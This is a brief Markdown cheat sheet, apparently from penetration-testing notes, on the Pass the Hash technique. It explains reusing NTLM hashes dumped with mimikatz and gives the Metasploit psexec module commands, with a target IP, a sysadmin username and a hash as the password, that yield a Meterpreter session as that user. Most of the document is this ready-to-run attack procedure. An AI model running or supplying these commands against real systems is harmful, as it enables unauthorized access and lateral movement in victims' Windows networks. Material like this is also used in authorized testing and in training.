# Pass the Hash 
- Pass the Hash is an exploitation technique that involves capturing the NTLM hashes of the users and utilizing them to authenticate the target.
- We can use tools like PSEXEC to pass the hash.

#### PASSING THE HASH

1. Suppose you got the password of another user while dumping hashes with mimikatz. We can use that hash to login legitimately as that user.
2. Load the PSEXEC module and set the Options.

```
use exploit/windows/smb/psexec
set RHOSTS 10.5.25.110
set SMBUSER sysadmin
set SMBPASS aad3b435b51404eeaad3b435b51404ee
exploit
```

3. This exploit will run and give a Meterpreter session of the specified user.
